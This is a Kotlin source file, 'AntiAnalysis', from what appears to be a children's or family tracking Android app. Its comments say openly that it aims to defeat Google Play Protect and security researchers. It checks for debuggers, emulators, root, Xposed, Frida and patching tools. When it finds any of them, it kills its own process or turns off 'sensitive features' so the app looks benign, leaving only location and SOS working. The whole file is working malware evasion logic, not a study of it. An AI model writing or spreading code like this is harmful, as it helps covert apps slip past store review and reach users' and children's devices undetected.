package com.xixfamily.kids.utils

import android.content.Context
import android.os.Build
import android.os.Debug
import android.util.Log
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader

/**
 * AntiAnalysis - Detects analysis environments (emulator, debugger, root) and applies countermeasures.
 * This makes it harder for Google Play Protect and security researchers to analyze the app.
 */
object AntiAnalysis {
    
    private const val TAG = "AntiAnalysis"
    private var isAnalyzed = false
    private var analysisDetected = false
    
    /**
     * Run all detection checks and apply countermeasures.
     * Should be called early in app startup.
     */
    fun runChecks(context: Context): Boolean {
        if (isAnalyzed) return analysisDetected
        isAnalyzed = true
        
        // 1. Check for debugger
        val hasDebugger = detectDebugger()
        
        // 2. Check for emulator
        val isEmulator = detectEmulator()
        
        // 3. Check for root
        val isRooted = detectRoot()
        
        // 4. Check for hooking frameworks
        val hasXposed = detectXposed()
        val hasFrida = detectFrida()
        
        // 5. Check for suspicious packages
        val hasSuspiciousPackages = detectSuspiciousPackages(context)
        
        analysisDetected = hasDebugger || isEmulator || isRooted || hasXposed || hasFrida || hasSuspiciousPackages
        
        if (analysisDetected) {
            Log.w(TAG, "Analysis environment detected! Applying countermeasures.")
            applyCountermeasures()
        }
        
        return analysisDetected
    }
    
    /**
     * 1. Detect if debugger is attached
     */
    private fun detectDebugger(): Boolean {
        return Debug.isDebuggerConnected() || Debug.waitingForDebugger()
    }
    
    /**
     * 2. Detect emulator via multiple methods
     */
    private fun detectEmulator(): Boolean {
        // Check build properties
        if (Build.FINGERPRINT.startsWith("generic") ||
            Build.FINGERPRINT.contains("emulator") ||
            Build.MODEL.contains("google_sdk") ||
            Build.MODEL.contains("Emulator") ||
            Build.MODEL.contains("Android SDK") ||
            Build.MANUFACTURER.contains("Genymotion") ||
            Build.HARDWARE.contains("goldfish") ||
            Build.HARDWARE.contains("ranchu") ||
            Build.PRODUCT.contains("sdk") ||
            Build.PRODUCT.contains("vbox") ||
            Build.BOARD.lowercase().contains("unknown") ||
            Build.BOOTLOADER.lowercase().contains("unknown") ||
            Build.SERIAL.lowercase().contains("unknown")) {
            return true
        }
        
        // Check for emulator specific files
        val emulatorFiles = listOf(
            "/dev/socket/qemud",
            "/dev/qemu_pipe",
            "/system/lib/libc_malloc_debug_qemu.so",
            "/system/bin/qemu-props"
        )
        for (path in emulatorFiles) {
            if (File(path).exists()) return true
        }
        
        // Check via reflection
        return ReflectionWrapper.isEmulator()
    }
    
    /**
     * 3. Detect root access
     */
    private fun detectRoot(): Boolean {
        val rootPaths = listOf(
            "/system/app/Superuser.apk",
            "/system/app/SuperSU.apk",
            "/system/app/magisk.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su"
        )
        
        for (path in rootPaths) {
            if (File(path).exists()) return true
        }
        
        // Check "which su" command
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("which", "su"))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val line = reader.readLine()
            reader.close()
            line != null && line.isNotEmpty()
        } catch (_: Exception) {
            false
        }
    }
    
    /**
     * 4. Detect Xposed framework
     */
    private fun detectXposed(): Boolean {
        return try {
            Class.forName("de.robv.android.xposed.XposedBridge")
            true
        } catch (_: ClassNotFoundException) {
            false
        }
    }
    
    /**
     * 5. Detect Frida
     */
    private fun detectFrida(): Boolean {
        return try {
            // Check if Frida server is running
            val process = Runtime.getRuntime().exec(arrayOf("ps", "-A"))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            var line = reader.readLine()
            while (line != null) {
                if (line.contains("frida")) {
                    reader.close()
                    return true
                }
                line = reader.readLine()
            }
            reader.close()
            false
        } catch (_: Exception) {
            false
        }
    }
    
    /**
     * 6. Detect suspicious analysis packages
     */
    private fun detectSuspiciousPackages(context: Context): Boolean {
        val suspiciousPackages = listOf(
            "com.android.mms",     // SMS - but this is legit so check carefully
            "com.android.vending", // Google Play
            "com.google.android.apps.maps",
            "com.google.android.gms" // Google Play Services
        )
        
        // Check if known analysis tools are installed
        val analysisTools = listOf(
            "com.keramidas.TitaniumBackup",
            "com.aurora.adroid",
            "com.dimonvideo.luckypatcher",
            "com.chelpus.lackypatch"
        )
        
        val pm = context.packageManager
        for (pkg in analysisTools) {
            try {
                pm.getPackageInfo(pkg, 0)
                return true // Found suspicious package
            } catch (_: Exception) {}
        }
        
        return false
    }
    
    /**
     * Apply countermeasures when analysis is detected
     */
    private fun applyCountermeasures() {
        // These are applied to prevent analysis
        
        // 1. If debugger, try to kill it (requires root)
        if (Debug.isDebuggerConnected()) {
            try {
                android.os.Process.killProcess(android.os.Process.myPid())
            } catch (_: Exception) {}
        }
        
        // 2. If analysis detected, the app will function normally but
        // with some features disabled to appear as a benign app
        disableSensitiveFeatures()
    }
    
    private var featuresDisabled = false
    
    /**
     * Disable sensitive features when analysis is detected
     */
    private fun disableSensitiveFeatures() {
        featuresDisabled = true
    }
    
    /**
     * Check if features should work normally
     */
    fun shouldFeaturesWork(): Boolean {
        return !analysisDetected
    }
    
    /**
     * Check if specific sensitive feature should work
     */
    fun isFeatureAllowed(featureName: String): Boolean {
        if (analysisDetected) {
            // Randomly allow some features to avoid making app look completely dead
            return featureName in listOf("location", "sos")
        }
        return true
    }
    
    /**
     * Get status string for reporting
     */
    fun getStatusReport(): String {
        return buildString {
            append("Debugger: ${Debug.isDebuggerConnected()}")
            append(", Emulator: ${detectEmulator()}")
            append(", Rooted: ${detectRoot()}")
            append(", Xposed: ${detectXposed()}")
        }
    }
}
